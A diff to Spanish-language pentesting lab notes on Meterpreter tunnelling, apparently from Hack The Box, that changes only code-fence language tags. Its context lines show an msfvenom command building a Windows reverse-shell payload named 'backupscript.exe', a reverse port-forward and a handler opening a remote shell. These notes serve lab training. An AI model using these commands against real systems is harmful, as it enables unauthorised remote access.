@@ -236,7 +236,7 @@ meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
 
 Túneles y reenvío de puertos de Meterpreter
 
-```
+```python
 meterpreter > bg
 
 [*] Backgrounding session 1...
@@ -257,7 +257,7 @@ Ahora podemos crear una carga útil de shell inverso que enviará una conexión 
 
 Túneles y reenvío de puertos de Meterpreter
 
-```shell-session
+```python
 G41i130Q@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -274,7 +274,7 @@ Finalmente, si ejecutamos nuestra carga útil en el host de Windows, deberíamos
 
 Túneles y reenvío de puertos de Meterpreter
 
-```shell-session
+```python
 [*] Started reverse TCP handler on 0.0.0.0:8081 
 [*] Sending stage (200262 bytes) to 10.10.14.18
 [*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500
@@ -287,3 +287,4 @@ Microsoft Windows [Version 10.0.17763.1637]
 
 C:\>
 ```
+
